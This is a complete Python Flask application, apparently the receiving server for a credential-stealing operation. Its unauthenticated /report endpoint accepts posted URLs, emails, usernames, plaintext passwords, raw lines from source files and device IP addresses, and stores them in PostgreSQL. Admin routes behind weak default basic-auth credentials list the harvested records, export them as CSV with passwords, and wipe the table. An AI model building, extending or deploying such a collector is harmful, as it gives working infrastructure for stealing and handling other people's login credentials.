# app.py
import os
import time
import io
import csv
import hmac
from flask import Flask, request, jsonify, Response, stream_with_context
import psycopg2
from psycopg2.extras import RealDictCursor

app = Flask(__name__)

# ---------- Config ----------
DB_DSN = os.getenv("DATABASE_URL")
if not DB_DSN:
    raise RuntimeError("DATABASE_URL environment variable is required")

ADMIN_USER = os.getenv("ADMIN_USER", "admin")
ADMIN_PASS = os.getenv("ADMIN_PASS", "secret")

# ---------- DB helper ----------
def get_db_conn():
    return psycopg2.connect(DB_DSN, sslmode="require", cursor_factory=RealDictCursor)

CREATE_TABLE_SQL = """
CREATE TABLE IF NOT EXISTS logs (
    id SERIAL PRIMARY KEY,
    device_ip INET,
    url TEXT,
    email TEXT,
    username TEXT,
    password TEXT,
    raw_line TEXT,
    source_file TEXT,
    user_agent TEXT,
    method TEXT,
    path TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
"""

def ensure_table(retries=8, delay_base=0.5):
    attempt = 0
    while attempt < retries:
        try:
            conn = get_db_conn()
            cur = conn.cursor()
            cur.execute(CREATE_TABLE_SQL)
            conn.commit()
            cur.close()
            conn.close()
            app.logger.info("DB connected and table ensured")
            return True
        except Exception as e:
            attempt += 1
            wait = delay_base * attempt
            app.logger.warning(
                "DB not ready (attempt %d/%d): %s — retrying in %.1fs",
                attempt, retries, e, wait
            )
            time.sleep(wait)
    app.logger.error("Could not ensure DB table after %d attempts", retries)
    return False

# Gọi ensure_table ngay khi module load
ensure_table()

# ---------- Basic Auth ----------
def check_basic_auth():
    auth = request.authorization
    if not auth or not auth.username or not auth.password:
        return False
    return (
        hmac.compare_digest(auth.username, ADMIN_USER)
        and hmac.compare_digest(auth.password, ADMIN_PASS)
    )

def require_auth():
    return Response("Authentication required", 401,
                    {"WWW-Authenticate": 'Basic realm="Login Required"'})

def requires_auth(func):
    def wrapper(*args, **kwargs):
        if not check_basic_auth():
            return require_auth()
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper

# ---------- Routes ----------
@app.route("/")
def index():
    return "Collector service is running"

@app.route("/report", methods=["POST", "GET"])
def report():
    data = {}
    if request.method == "POST":
        try:
            data = request.get_json(force=True, silent=True) or {}
        except Exception:
            data = {}

    # Resolve device IP
    device_ip = (
        data.get("public_ipv4")
        or data.get("public_ipv6")
        or (data.get("local_ips") or [None])[0]
        or (request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
            if request.headers.get("X-Forwarded-For") else None)
        or request.remote_addr
    )

    record = {
        "device_ip": device_ip,
        "url": data.get("url"),
        "email": data.get("email"),
        "username": data.get("username"),
        "password": data.get("password"),
        "raw_line": data.get("raw_line"),
        "source_file": data.get("source_file"),
        "user_agent": request.headers.get("User-Agent", ""),
        "method": request.method,
        "path": request.path
    }

    try:
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO logs
            (device_ip, url, email, username, password, raw_line, source_file,
             user_agent, method, path)
            VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)
        """, (
            record["device_ip"], record["url"], record["email"], record["username"],
            record["password"], record["raw_line"], record["source_file"],
            record["user_agent"], record["method"], record["path"]
        ))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        app.logger.exception("DB insert failed: %s", e)
        return jsonify({"error": "db_insert_failed", "detail": str(e)}), 500

    return jsonify({"status": "ok", "device_ip": device_ip}), 201

@app.route("/list")
@requires_auth
def list_logs():
    limit = int(request.args.get("limit", "100"))
    try:
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            SELECT id, device_ip::text AS device_ip, url, email, username,
                   raw_line, source_file, user_agent, method, path, created_at
            FROM logs
            ORDER BY created_at DESC
            LIMIT %s
        """, (limit,))
        rows = cur.fetchall()
        cur.close()
        conn.close()
        return jsonify(rows)
    except Exception as e:
        app.logger.exception("list failed: %s", e)
        return jsonify({"error": str(e)}), 500

@app.route("/export")
@requires_auth
def export_csv():
    limit = int(request.args.get("limit", "1000"))

    def generate():
        header = ["id","device_ip","url","email","username","password",
                  "raw_line","source_file","user_agent","method","path","created_at"]
        out = io.StringIO()
        writer = csv.writer(out)
        writer.writerow(header)
        yield out.getvalue()
        out.seek(0); out.truncate(0)

        try:
            conn = get_db_conn()
            cur = conn.cursor(name="export_cursor", cursor_factory=RealDictCursor)
            cur.itersize = 1000
            cur.execute("""
                SELECT id, device_ip::text AS device_ip, url, email, username,
                       password, raw_line, source_file, user_agent,
                       method, path, created_at
                FROM logs
                ORDER BY created_at DESC
                LIMIT %s
            """, (limit,))
            for row in cur:
                writer.writerow([row.get(c) for c in header])
                yield out.getvalue()
                out.seek(0); out.truncate(0)
            cur.close(); conn.close()
        except Exception as e:
            app.logger.exception("export failed: %s", e)
            out.write("\n"); yield out.getvalue()

    filename = f"logs_export_{int(time.time())}.csv"
    return Response(stream_with_context(generate()), mimetype="text/csv",
        headers={"Content-Disposition": f"attachment; filename={filename}"})

@app.route("/clear_logs", methods=["POST"])
@requires_auth
def clear_logs():
    try:
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("TRUNCATE TABLE logs;")
        conn.commit()
        cur.close(); conn.close()
        return jsonify({"status": "cleared"})
    except Exception as e:
        app.logger.exception("clear failed: %s", e)
        return jsonify({"error": str(e)}), 500

# ---------- run ----------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
